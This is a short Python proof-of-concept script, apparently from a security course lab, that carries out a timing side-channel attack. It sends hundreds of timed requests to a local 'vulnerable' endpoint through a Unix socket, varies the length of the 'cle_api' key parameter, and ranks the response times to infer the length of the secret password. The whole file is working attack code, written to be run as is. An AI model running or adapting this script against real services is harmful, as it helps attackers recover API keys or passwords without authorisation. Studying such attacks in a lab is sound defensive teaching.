import timeit
from statistics import mean, median
from string import ascii_letters
from time import sleep

import numpy as np
import httpx

transport = httpx.HTTPTransport(uds="/tmp/securite-tp2-poc.sock")
client = httpx.Client(transport=transport)

URL_BASE = "http://localhost/vulnerable?cle_api="
MIN = 10
MAX = 20
WARMUP_REQUESTS = 4
REQUESTS = 600
SLEEP = 0.001

result = np.zeros((MAX - MIN, REQUESTS + 1))
for idx, val in enumerate(range(MIN, MAX)):
    result[idx][0] = val


character = 0


def send_request(i):
    global character
    character += 1
    character %= len(ascii_letters)

    client.get(URL_BASE + (ascii_letters[character] * i))


for repeat in range(REQUESTS):
    for idx, i in enumerate(range(MIN, MAX)):
        timeit.timeit(lambda: send_request(i), number=WARMUP_REQUESTS)
        data = timeit.timeit(lambda: send_request(i), number=1)
        result[idx][repeat + 1] = data
        sleep(SLEEP)

stats = np.zeros((MAX - MIN, 5))

for row_idx, row in enumerate(result):
    data = row[1:]
    print(f"---{MIN + row_idx}---")
    print("Mean:", mean(data))
    print("Median:", median(data))
    print("Min:", min(data))
    print("Max:", max(data))
    print("")

    stats[row_idx] = [row[0], mean(data), median(data), min(data), max(data)]

stats = stats[stats[:, 3].argsort()[::-1]]
for [length, *row_stat] in stats:
    print(f"{int(length)}\t{row_stat}")
print(f"We think the password is {int(stats[0][0])} characters long")